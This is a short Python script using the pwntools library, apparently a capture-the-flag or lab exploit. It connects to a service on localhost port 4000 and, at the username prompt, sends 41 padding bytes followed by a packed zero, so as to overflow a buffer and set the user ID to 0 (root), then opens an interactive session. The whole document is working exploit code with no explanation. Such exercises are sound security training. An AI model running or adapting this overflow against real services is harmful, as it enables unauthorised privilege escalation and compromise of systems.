from pwn import *

io = remote('localhost', 4000)

io.recvuntil(b"username: ")

offset = 41
padding = b"A" * offset

fake_uid = p32(0) 

payload = padding + fake_uid

io.sendline(payload)

io.interactive()
